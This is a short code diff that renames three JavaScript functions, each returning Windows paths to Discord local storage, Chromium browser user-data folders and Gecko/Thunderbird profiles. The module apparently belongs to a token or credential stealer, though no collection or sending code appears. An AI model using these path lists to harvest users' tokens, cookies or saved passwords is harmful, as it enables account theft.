@@ -1,4 +1,4 @@
-const getDiscordPaths = () => {
+const GetDiscordPaths = () => {
     return {
         'Discord Canary': `discordcanary\\Local Storage`,
         'Discord PTB':    `discordptb\\Local Storage`,
@@ -7,7 +7,7 @@ const getDiscordPaths = () => {
     }
 };
 
-const getChromiumBrowsers = () => {
+const GetChromiumBrowsers = () => {
     return {
         'Google(x86)':   `AppData\\Local\\Google(x86)\\Chrome\\User Data`,
         'Google SxS':    `AppData\\Local\\Google\\Chrome SxS\\User Data`,
@@ -49,7 +49,7 @@ const getChromiumBrowsers = () => {
     }
 };
 
-const getGeckoBrowsers = () => {
+const GetGeckoBrowsers = () => {
     return {
 		'Thunderbird': `AppData\\Roaming\\Thunderbird\\Profiles`,
 		'IceDragon':   `AppData\\Roaming\\Comodo\\IceDragon\\Profiles`,
@@ -65,7 +65,7 @@ const getGeckoBrowsers = () => {
 };
 
 module.exports = {
-    getDiscordPaths,
-    getChromiumBrowsers,
-    getGeckoBrowsers
-}
+    GetDiscordPaths,
+    GetChromiumBrowsers,
+    GetGeckoBrowsers
+};
